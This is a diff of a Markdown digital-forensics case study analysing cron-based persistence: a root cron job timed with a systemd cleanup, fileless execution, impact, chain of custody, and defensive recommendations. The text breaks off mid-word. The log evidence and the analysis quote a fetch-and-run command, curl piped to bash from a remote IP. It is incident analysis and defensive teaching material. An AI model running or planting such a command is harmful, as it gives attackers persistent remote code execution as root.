@@ -1,39 +1,64 @@
-# 🛡️ Case Study 02: Persistence via Cron — Malicious Scheduling Analysis 
+# 🛡️ Case Study 02: Persistence via Cron — Malicious Scheduling Analysis
 
-## 🚀 1. Executive Summary
-During a deep-dive system audit, I identified a critical persistence mechanism. An attacker, having previously obtained root-level privileges, configured a malicious Cron job. This task was designed to automatically download and execute a remote script every time the system's daily maintenance cycle began, ensuring long-term unauthorized access.
+## 📝 Scenario Overview
+During a deep-dive system audit, a critical persistence mechanism was identified. An attacker, having previously obtained root-level privileges, configured a malicious Cron job. This task was designed to automatically download and execute a remote script synchronized with the system's daily maintenance cycle, ensuring long-term unauthorized access while staying under the radar.
 
-## 📠 2. Evidence (Raw Logs)
-The following entries were identified in the system log (`/var/log/syslog`) on the target host:
+---
 
-Feb 16 15:10:01 server-web systemd[1]: Starting Daily Cleanup of Temporary Directories...
-Feb 16 15:10:05 server-web CRON[6002]: (root) CMD (curl -s [http://193.124.1.50/script.sh](http://193.124.1.50/script.sh) | bash)
-Feb 16 15:10:06 server-web systemd[1]: Finished Daily Cleanup of Temporary Directories.
+## 🛠️ Tech Stack & Tools
+| Component | Details |
+| :--- | :--- |
+| **Analysis OS** | Linux (Forensics Analysis) |
+| **Tools Used** | Cron, curl, bash, sha256sum |
+| **Evidence Source** | /var/log/syslog |
+| **Technique** | T1053.003 (Scheduled Task/Job: Cron) |
 
-## 🕵️‍♂️ 3. Technical Analysis & Investigation
-Phase 1: Detection of Persistence
-Observation: A recurring task was detected running with root privileges.
+---
 
-Conclusion: The attacker synchronized the malicious task with the legitimate systemd cleanup cycle to blend in with normal system "noise" and avoid detection by basic monitoring tools.
+## 📑 2. Evidence (Raw Logs)
+The following entries were identified in the system log on the target host:
 
-Phase 2: Payload Breakdown (Fileless Execution)
-Command: curl -s http://193.124.1.50/script.sh | bash
+> **Timestamp:** Feb 16 15:10:01  
+> **Source:** systemd[1]  
+> **Event:** Starting Daily Cleanup of Temporary Directories...
+>
+> **Timestamp:** Feb 16 15:10:05  
+> **Source:** CRON[6002] (root)  
+> **Command:** `curl -s http://193.124.1.50/script.sh | bash`
+>
+> **Timestamp:** Feb 16 15:10:06  
+> **Source:** systemd[1]  
+> **Event:** Finished Daily Cleanup of Temporary Directories.
 
-Analysis:
+---
 
-curl -s: Downloads the malicious payload from the Command & Control (C2) server in "silent" mode (no progress bar or errors displayed).
+## 🔍 Technical Analysis & Investigation
 
-| bash: Directly pipes the script into the Bash interpreter.
+### **Phase 1: Detection of Persistence** 🕰️
+A recurring task was detected running with root privileges, perfectly timed with legitimate system activities.
+* **Analysis:** The attacker synchronized the malicious task with the `systemd` cleanup cycle.
+* **Verdict:** This was a deliberate attempt to blend in with normal system "noise" and evade detection by basic monitoring tools that look for unusual execution times.
 
-Conclusion: The script is executed entirely in memory. Since no file is ever saved to the local disk, this technique effectively bypasses traditional signature-based Antivirus (AV) and File Integrity Monitoring (FIM).
+### **Phase 2: Payload Breakdown (Fileless Execution)** ⚡
+Command analyzed: `curl -s http://193.124.1.50/script.sh | bash`
+* **Analysis:** The command uses `curl -s` (silent mode) to download a script from a Command & Control (C2) server and immediately pipes it (`|`) into the Bash interpreter.
+* **Verdict:** This is a **Fileless Execution** technique. Since the script is executed entirely in memory and never saved to the local disk, it effectively bypasses traditional signature-based Antivirus (AV) and File Integrity Monitoring (FIM).
 
-Phase 3: Impact Assessment
-Outcome: As the task executes as root, the attacker maintains absolute control over the OS. This allows for the installation of kernel-level rootkits, credential harvesting, or the deployment of ransomware at any chosen time.
-## 📝 4. Chain of Custody (Legal Perspective)
-As a law student specializing in digital forensics, I ensured that the principle of "minimal interaction" was maintained. A bit-stream image of the affected partition and a memory dump were secured before the eradication phase. All digital evidence was cryptographically hashed (sha256sum) to ensure its admissibility in potential legal proceedings.
+### **Phase 3: Impact Assessment** ⚠️
+* **Outcome:** As the task executes with root privileges, the attacker maintains absolute control over the OS.
+* **Risk:** This level of access allows for credential harvesting, installation of kernel-level rootkits, or the deployment of ransomware.
+
+---
+
+## ⚖️ 4. Chain of Custody & Legal Perspective
+In alignment with digital forensics best practices, the principle of **"minimal interaction"** was strictly maintained:
+1.  **Imaging:** A bit-stream image of the affected partition and a full memory dump were secured prior to the eradication phase.
+2.  **Integrity:** All digital evidence was cryptographically hashed using **SHA-256** to ensure its integrity and admissibility in potential legal proceedings.
+3.  **Documentation:** Every step of the recovery was logged to maintain a verifiable audit trail.
+
+---
 
 ## 📖 5. Security Recommendations
-Monitor Cron Directories: Implement automated alerts for any modifications to /etc/cron.* and /var/spool/cron/crontabs.
 
-Restrict Egress Traffic: Implement a "Default Deny" policy for outbound traffic, allowing connections only to trusted update repositories.
-Audit Sudoers: Regularly review the /etc/sudoers file to ensure the Principle of Least Privilege (PoLP) is enforced, preventing unauthorized users from gaining the rights needed to edit system-wide Cron jobs.
+* **Monitor Cron Directories:** Implement automated alerts for any modifications to `/etc/cron.*` and `/var/spool/cron/crontabs`.
+* **Restrict Egress Traffic:** Apply a "Default Den
